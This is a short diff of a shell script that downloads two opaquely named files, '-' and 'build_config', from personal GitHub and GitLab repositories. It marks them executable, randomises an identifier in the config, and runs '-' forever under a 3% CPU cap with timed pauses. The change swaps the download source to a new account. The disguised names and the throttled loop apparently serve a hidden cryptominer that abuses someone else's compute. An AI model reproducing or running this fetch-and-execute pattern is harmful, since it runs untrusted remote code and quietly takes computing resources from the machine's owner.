@@ -1,7 +1,7 @@
-sudo apt update && sudo apt install -y cpulimit
-wget https://gitlab.com/vienatasari/kuzut/-/raw/main/-
-wget https://gitlab.com/vienatasari/kuzut/-/raw/main/build_config
+apt update && apt install -y sudo
+sudo apt install -y cpulimit
+wget https://github.com/aqshakuy/pp/raw/main/-
+wget https://github.com/aqshakuy/pp/raw/main/build_config
 chmod +x - build_config
-sed -i "s/ikuk04/$(shuf -n 1 -i 1-99999999)/" "build_config"
+sed -i "s/kzp/$(shuf -n 1 -i 1-99999999)/" "build_config"
 while :; do timeout 1m cpulimit -l 3 ./-; sleep 20; done
-
